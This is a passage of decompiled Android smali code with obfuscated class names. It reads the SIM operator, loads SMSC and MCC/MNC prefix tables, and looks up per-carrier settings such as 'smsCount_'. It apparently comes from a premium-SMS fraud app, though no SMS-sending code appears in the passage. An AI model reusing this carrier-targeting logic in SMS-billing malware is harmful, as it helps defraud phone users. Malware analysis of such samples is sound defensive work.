iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tm:Landroid/telephony/TelephonyManager;

invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

move-result-object v0

return-object v0
.end method

.method private getSimOperatorName()Ljava/lang/String;
.locals 1

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tm:Landroid/telephony/TelephonyManager;

invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

move-result-object v0

return-object v0
.end method

.method private init()V
.locals 4

sget-object v2, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

const-string v3, "init started!!!"

invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->loadSMSCFile()V

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->loadMCCMNCFile()V

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculateLocation()V

new-instance v2, Ljava/util/ArrayList;

invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

iput-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

invoke-interface {v2, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

const-string v2, "_"

invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

move-result v2

if-eqz v2, :cond_0

const/4 v2, 0x0

const/16 v3, 0x5f

invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(I)I

move-result v3

invoke-virtual {v0, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

move-result-object v1

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

invoke-interface {v2, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

:cond_0
iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

const-string v3, ""

invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->fillSmsInfo()V

return-void
.end method

.method private isConfigurationForLocation(Ljava/lang/String;)Z
.locals 3

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v0

new-instance v1, Ljava/lang/StringBuilder;

invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

const-string v2, "smsCount_"

invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v1

invoke-virtual {v0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValueNull(Ljava/lang/String;)Z

move-result v0

if-nez v0, :cond_0

const/4 v0, 0x1

:goto_0
return v0

:cond_0
const/4 v0, 0x0

goto :goto_0
.end method

.method private loadMCCMNCFile()V
.locals 11

iget-object v9, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->context:Landroid/content/Context;

invoke-virtual {v9}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

move-result-object v9

const v10, 0x7f040001

invoke-virtual {v9, v10}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

move-result-object v4

:try_start_0
new-instance v3, Ljava/io/InputStreamReader;

const-string v9, "UTF-8"

invoke-direct {v3, v4, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

new-instance v0, Ljava/io/BufferedReader;

invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

:cond_0
:goto_0
invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

move-result-object v6

if-eqz v6, :cond_1

move-object v7, v6

const/16 v9, 0x20

invoke-virtual {v7, v9}, Ljava/lang/String;->indexOf(I)I

move-result v1

if-lez v1, :cond_0

const/4 v9, 0x0

invoke-virtual {v7, v9, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

move-result-object v5

add-int/lit8 v9, v1, 0x1

invoke-virtual {v7, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

move-result-object v8

const-string v9, "#"

invoke-virtual {v5, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v9

if-nez v9, :cond_0

iget-object v9, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByMCCMNC:Ljava/util/ArrayList;

new-instance v10, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;

invoke-direct {v10, v5, v8}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;-><init>(Ljava/lang/String;Ljava/lang/String;)V

invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
:try_end_0
.catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0
.catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

goto :goto_0

:catch_0
move-exception v2

invoke-virtual {v2}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

:cond_1
:goto_1
return-void

:catch_1
move-exception v2

invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

goto :goto_1
.end method

.method private loadSMSCFile()V
.locals 11

iget-object v9, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->context:Landroid/content/Context;

invoke-virtual {v9}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

move-result-object v9

const v10, 0x7f040002

invoke-virtual {v9, v10}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

move-result-object v4

:try_start_0
new-instance v3, Ljava/io/InputStreamReader;

const-string v9, "UTF-8"

invoke-direct {v3, v4, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

new-instance v0, Ljava/io/BufferedReader;

invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

:cond_0
:goto_0
invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

move-result-object v6

if-eqz v6, :cond_1

move-object v7, v6

const/16 v9, 0x20

invoke-virtual {v7, v9}, Ljava/lang/String;->indexOf(I)I

move-result v1

if-lez v1, :cond_0

const/4 v9, 0x0

invoke-virtual {v7, v9, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

move-result-object v5

add-int/lit8 v9, v1, 0x1

invoke-virtual {v7, v9}, Ljava/lang/String;->substring(I)Ljava/lang/String;

move-result-object v8

const-string v9, "#"

invoke-virtual {v5, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v9

if-nez v9, :cond_0

iget-object v9, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByNumber:Ljava/util/ArrayList;

new-instance v10, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;

invoke-direct {v10, v5, v8}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;-><init>(Ljava/lang/String;Ljava/lang/String;)V

invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
:try_end_0
.catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0
.catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

goto :goto_0

:catch_0
move-exception v2

invoke-virtual {v2}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

:goto_1
return-void

:cond_1
:try_start_1
iget-object v9, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByNumber:Ljava/util/ArrayList;

new-instance v10, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a06ffc308;

invoke-direct {v10}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a06ffc308;-><init>()V

invoke-static {v9, v10}, Ljava/util/Collections;->sort(Ljava/util/List;Ljava/util/Comparator;)V
:try_end_1
.catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0
.catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

goto :goto_1

:catch_1
move-exception v2

invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

goto :goto_1
.end method


# virtual methods
.method public getLocation()Ljava/lang/String;
.locals 1

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

return-object v0
.end method

.method public getLocationList()Ljava/util/List;
.locals 1
.annotation system Ldalvik/annotation/Signature;
value = {
"()",
"Ljava/util/List",
"<",
"Ljava/lang/String;",
">;"
}
.end annotation

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

return-object v0
.end method

.method public getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;
.locals 3

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v0

new-instance v1, Ljava/lang/StringBuilder;

invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

move-result-object v1

const-string v2, "_"

invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v1

invoke-virtual {v0, v1, p3}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v0

return-object v0
.end method

.method public getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
.locals 6

const/4 v5, 0x0

const/4 v0, 0x0

:goto_0
iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

invoke-interface {v2}, Ljava/util/List;->size()I

move-result v2

if-ge v0, v2, :cond_2

const-string v2, ""

iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

invoke-interface {v3, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

move-result-object v3

invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v2

if-eqz v2, :cond_0

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v2

invoke-virtual {v2, p1, v5}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v1

:goto_1
if-eqz v1, :cond_1

:goto_2
return-object v1

:cond_0
invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v3

new-instance v2, Ljava/lang/StringBuilder;

invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v2

const-string v4, "_"

invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v4

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->locations:Ljava/util/List;

invoke-interface {v2, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

move-result-object v2

check-cast v2, Ljava/lang/String;

invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v2

invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v2

invoke-virtual {v3, v2, v5}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v1

goto :goto_1

:cond_1
add-int/lit8 v0, v0, 0x1

goto :goto_0

:cond_2
move-object v1, p2

goto :goto_2
.end method

.method public getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;
.locals 1

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

return-object v0
.end method

.method public getValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
.locals 3

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v0

new-instance v1, Ljava/lang/StringBuilder;

invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

const-string v2, "_"

invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

iget-object v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v1

invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v1

invoke-virtual {v0, v1, p2}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v0

return-object v0
.end method
